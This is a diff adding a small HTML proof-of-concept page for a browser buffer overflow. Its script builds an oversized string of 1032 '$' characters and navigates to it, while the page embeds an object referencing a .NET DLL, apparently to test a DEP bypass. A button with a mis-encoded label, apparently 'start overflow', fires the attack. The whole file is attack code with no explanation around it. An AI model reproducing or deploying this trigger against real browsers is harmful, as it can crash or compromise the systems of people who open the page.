@@ -1,0 +1,17 @@
+<html>
+<head>
+<script>
+function exploit()
+{
+var url='';
+for(var i=0; i<1032; i++)
+    url += '\x24';	
+window.location=url + '.html';
+}
+</script>
+</head>
+<body>
+<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
+<input type="button" value="¿ªÊ¼Òç³ö" onclick="exploit()" />
+</body>
+</html>
